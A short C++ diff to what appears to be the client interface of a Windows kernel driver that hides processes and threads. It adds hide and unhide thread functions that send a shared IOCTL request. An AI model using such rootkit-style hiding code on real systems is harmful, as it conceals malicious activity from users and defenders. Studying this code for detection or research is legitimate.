@@ -79,8 +79,20 @@ NidhoggErrorCodes NidhoggInterface::ProcessUnhide(DWORD pid) {
 
 NidhoggErrorCodes NidhoggInterface::ThreadHide(DWORD tid) {
 	DWORD returned;
+	HiddenThread hiddenThread{ tid, true };
 
-	if (!DeviceIoControl(this->hNidhogg, IOCTL_HIDE_THREAD, &tid, sizeof(tid), nullptr, 0, &returned, nullptr))
+	if (!DeviceIoControl(this->hNidhogg, IOCTL_HIDE_UNHIDE_THREAD, &hiddenThread, sizeof(hiddenThread), nullptr, 0,
+		&returned, nullptr))
+		return NIDHOGG_ERROR_DEVICECONTROL_DRIVER;
+	return NIDHOGG_SUCCESS;
+}
+
+NidhoggErrorCodes NidhoggInterface::ThreadUnhide(DWORD tid) {
+	DWORD returned;
+	HiddenThread hiddenThread{ tid, false };
+
+	if (!DeviceIoControl(this->hNidhogg, IOCTL_HIDE_UNHIDE_THREAD, &hiddenThread, sizeof(hiddenThread), nullptr, 0,
+		&returned, nullptr))
 		return NIDHOGG_ERROR_DEVICECONTROL_DRIVER;
 	return NIDHOGG_SUCCESS;
 }
